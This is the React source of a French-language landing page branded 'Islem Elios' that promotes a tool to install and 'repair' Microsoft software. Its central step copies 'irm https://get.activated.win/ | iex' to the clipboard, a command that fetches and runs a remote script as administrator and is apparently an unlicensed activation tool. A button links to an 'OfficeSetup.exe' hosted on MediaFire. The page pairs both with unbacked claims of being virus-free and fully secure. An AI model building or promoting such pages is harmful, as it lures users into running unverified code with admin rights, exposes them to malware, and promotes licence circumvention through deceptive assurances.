import { motion } from "motion/react";
import { Copy, Check, Download, ShieldCheck, Zap, Terminal, Activity, ChevronRight, Lock, Monitor, ArrowRight } from "lucide-react";
import { useState } from "react";

export default function App() {
  const [copied, setCopied] = useState(false);
  const realDownloadUrl = "https://www.mediafire.com/file/uye7udy7xq78vi1/OfficeSetup.exe/file";

  const handleCopy = () => {
    navigator.clipboard.writeText("irm https://get.activated.win/ | iex");
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-[#030712] text-slate-200 font-sans selection:bg-blue-500/30 overflow-x-hidden">
      {/* Dynamic Background */}
      <div className="fixed inset-0 z-0 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#1e293b_1px,transparent_1px),linear-gradient(to_bottom,#1e293b_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] opacity-20" />
        <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] bg-blue-600/20 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-5%] w-[40%] h-[40%] bg-indigo-600/20 rounded-full blur-[150px]" />
      </div>

      {/* Navigation */}
      <nav className="relative z-50 border-b border-white/5 bg-[#030712]/50 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-500 to-indigo-600 p-[1px]">
              <div className="w-full h-full bg-[#030712] rounded-xl flex items-center justify-center">
                <Monitor className="w-5 h-5 text-blue-400" />
              </div>
            </div>
            <span className="text-xl font-bold tracking-tight text-white">
              Islem <span className="text-blue-500">Elios</span>
            </span>
          </div>
          
          <div className="hidden md:flex items-center gap-8 text-sm font-medium text-slate-400">
            <span className="flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
              Systèmes Opérationnels
            </span>
          </div>
        </div>
      </nav>

      <main className="relative z-10">
        <div className="max-w-7xl mx-auto px-6 pt-24 pb-32">
          <div className="grid lg:grid-cols-2 gap-16 lg:gap-8 items-center">
            
            {/* Left Content - Hero */}
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="flex flex-col items-start"
            >
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-bold uppercase tracking-widest mb-8">
                <ShieldCheck className="w-4 h-4" />
                <span>Certification Islem Elios</span>
              </div>
              
              <h1 className="text-5xl sm:text-6xl lg:text-7xl font-extrabold text-white leading-[1.1] tracking-tight mb-8">
                L'écosystème <br />
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-indigo-400 to-blue-500">
                  Microsoft
                </span> <br />
                Sans compromis.
              </h1>
              
              <p className="text-lg sm:text-xl text-slate-400 leading-relaxed mb-10 max-w-xl">
                La solution définitive pour réparer, optimiser et installer vos applications Windows. Profitez d'une expérience fluide, 100% sécurisée et garantie sans aucun virus.
              </p>

              <div className="flex flex-col sm:flex-row items-center gap-4 w-full sm:w-auto">
                <a 
                  href={realDownloadUrl}
                  className="w-full sm:w-auto inline-flex items-center justify-center gap-3 px-8 py-4 bg-white text-[#030712] hover:bg-slate-200 font-bold text-lg rounded-2xl transition-all shadow-[0_0_40px_-10px_rgba(255,255,255,0.3)] hover:scale-[1.02] active:scale-95 group"
                >
                  <Download className="w-5 h-5" />
                  <span>Télécharger l'App</span>
                </a>
              </div>
              
              <div className="mt-8 flex items-center gap-6 text-sm font-medium text-slate-500">
                <div className="flex items-center gap-2">
                  <Check className="w-4 h-4 text-emerald-500" />
                  <span>Windows 10 & 11</span>
                </div>
                <div className="flex items-center gap-2">
                  <Check className="w-4 h-4 text-emerald-500" />
                  <span>Script Open Source</span>
                </div>
              </div>
            </motion.div>

            {/* Right Content - Terminal */}
            <motion.div 
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="relative w-full max-w-xl mx-auto lg:ml-auto"
            >
              {/* Decorative Glow */}
              <div className="absolute -inset-1 bg-gradient-to-r from-blue-500 to-indigo-600 rounded-[32px] blur-2xl opacity-20 animate-pulse" />
              
              <div className="relative bg-[#0a0f1c] border border-white/10 rounded-[28px] overflow-hidden shadow-2xl backdrop-blur-xl">
                {/* Terminal Header */}
                <div className="bg-white/[0.02] border-b border-white/5 h-14 flex items-center justify-between px-6">
                  <div className="flex gap-2">
                    <div className="w-3 h-3 rounded-full bg-slate-700 hover:bg-red-500 transition-colors" />
                    <div className="w-3 h-3 rounded-full bg-slate-700 hover:bg-amber-500 transition-colors" />
                    <div className="w-3 h-3 rounded-full bg-slate-700 hover:bg-emerald-500 transition-colors" />
                  </div>
                  <div className="flex items-center gap-2 text-xs font-mono text-slate-500">
                    <Terminal className="w-4 h-4" />
                    <span>Windows PowerShell</span>
                  </div>
                  <div className="w-12" /> {/* Spacer for centering */}
                </div>

                {/* Terminal Body */}
                <div className="p-6 sm:p-8 font-mono text-sm sm:text-base leading-relaxed">
                  <div className="text-slate-500 mb-2"># Exécutez cette commande en mode Administrateur</div>
                  <div className="flex mb-8">
                    <span className="text-emerald-400 mr-3">PS&gt;</span>
                    <span className="text-blue-300">irm</span>
                    <span className="text-slate-300 ml-2">https://get.activated.win/</span>
                    <span className="text-blue-300 ml-2">|</span>
                    <span className="text-blue-300 ml-2">iex</span>
                  </div>

                  {/* Copy Action Box */}
                  <div className="mt-8 bg-blue-500/10 border border-blue-500/20 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-between gap-4">
                     <span className="text-blue-200 text-sm">Copier le script d'installation directe</span>
                     <button
                        onClick={handleCopy}
                        className="w-full sm:w-auto px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg transition-all flex items-center justify-center gap-2 font-sans font-semibold text-sm shadow-lg shadow-blue-500/20 active:scale-95"
                      >
                        {copied ? (
                          <>
                            <Check className="w-4 h-4" />
                            <span>Copié !</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-4 h-4" />
                            <span>Copier</span>
                          </>
                        )}
                      </button>
                  </div>
                </div>
              </div>
            </motion.div>

          </div>
        </div>

        {/* Features Grid */}
        <div className="border-t border-white/5 bg-white/[0.02]">
          <div className="max-w-7xl mx-auto px-6 py-24">
            <div className="text-center mb-16">
              <h2 className="text-3xl font-bold text-white mb-4">Conçu pour l'excellence</h2>
              <p className="text-slate-400 max-w-2xl mx-auto text-lg">
                Notre architecture garantit une intégration parfaite avec Windows, protégeant vos données tout en optimisant vos performances.
              </p>
            </div>

            <div className="grid md:grid-cols-3 gap-8">
              {/* Feature 1 */}
              <div className="bg-[#0a0f1c] border border-white/5 p-8 rounded-[24px] hover:border-blue-500/30 transition-colors group">
                <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl flex items-center justify-center mb-6 text-emerald-400 group-hover:scale-110 transition-transform">
                  <ShieldCheck className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Sécurité Absolue</h3>
                <p className="text-slate-400 leading-relaxed">
                  Aucun malware, aucun virus. Le script est transparent et validé pour respecter l'intégrité de votre système d'exploitation.
                </p>
              </div>

              {/* Feature 2 */}
              <div className="bg-[#0a0f1c] border border-white/5 p-8 rounded-[24px] hover:border-blue-500/30 transition-colors group">
                <div className="w-12 h-12 bg-blue-500/10 rounded-2xl flex items-center justify-center mb-6 text-blue-400 group-hover:scale-110 transition-transform">
                  <Zap className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Vitesse Éclair</h3>
                <p className="text-slate-400 leading-relaxed">
                  Déploiement instantané. Ne perdez plus des heures à chercher, téléchargez et installez vos outils d'un simple clic.
                </p>
              </div>

              {/* Feature 3 */}
              <div className="bg-[#0a0f1c] border border-white/5 p-8 rounded-[24px] hover:border-blue-500/30 transition-colors group">
                <div className="w-12 h-12 bg-indigo-500/10 rounded-2xl flex items-center justify-center mb-6 text-indigo-400 group-hover:scale-110 transition-transform">
                  <Activity className="w-6 h-6" />
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Performances Optimales</h3>
                <p className="text-slate-400 leading-relaxed">
                  Réparez les fichiers corrompus et profitez d'une machine qui fonctionne comme neuve, débarrassée des ralentissements.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="border-t border-white/5 bg-[#030712]">
          <div className="max-w-7xl mx-auto px-6 py-12 flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="flex items-center gap-2 text-slate-400">
              <Monitor className="w-5 h-5 text-blue-500" />
              <span className="font-bold text-white">Islem Elios</span>
              <span>© 2026 Tous droits réservés.</span>
            </div>
            
            <div className="flex items-center gap-6 text-sm font-medium text-slate-500">
              <span className="hover:text-white transition-colors cursor-pointer">Conditions d'utilisation</span>
              <span className="hover:text-white transition-colors cursor-pointer">Confidentialité</span>
            </div>
          </div>
        </footer>
      </main>
    </div>
  );
}

